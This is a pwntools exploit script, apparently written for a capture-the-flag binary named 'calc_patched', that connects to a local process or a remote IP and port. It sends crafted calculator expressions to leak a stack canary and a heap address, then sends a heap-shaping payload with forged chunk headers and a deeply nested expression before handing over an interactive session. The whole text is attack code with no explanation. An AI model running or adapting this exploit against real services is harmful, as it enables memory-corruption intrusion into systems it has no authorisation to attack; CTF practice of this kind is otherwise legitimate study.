from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
from time import sleep
import struct

if args.LOCAL:
    io = process('./calc_patched')
    if args.GDB:
        cmd="""
        b* 0x804A310
        """
        gdb.attach(io, cmd)
        
elif args.REMOTE:
    io = remote('3.125.9.27', 20000)
    
else:
    io = remote('0', 20000)

elf = ELF('./calc_patched')
libc = ELF('./libc.so.6')

def calc(exp):
    io.sendlineafter(b'INPUT >>', exp)
    sleep(0.1)

def i2s(addr):
    return str(u32(p32(addr))).encode()
    
ptr = 0x804d4a4

pause()
# leak heap

calc(b'(99999999999999999999+111/0)/0')
io.recvuntil(b'110')
canary = u32(b'\0'+io.recv(3))
print(hex(canary))

io.send(b'A'*0x2f)

io.recvuntil(b'0x', drop=True)
heap = int(io.recv(7), 16) - 0x590

log.info('@ heap ' + hex(heap)) 


calc(b'A'*0x200+p32(0)*2+p32(0)+p32(0x20)+p32(0)*7+p32(0x11))

calc(b'('*255+b'1+1'+b')'*255)



io.interactive()   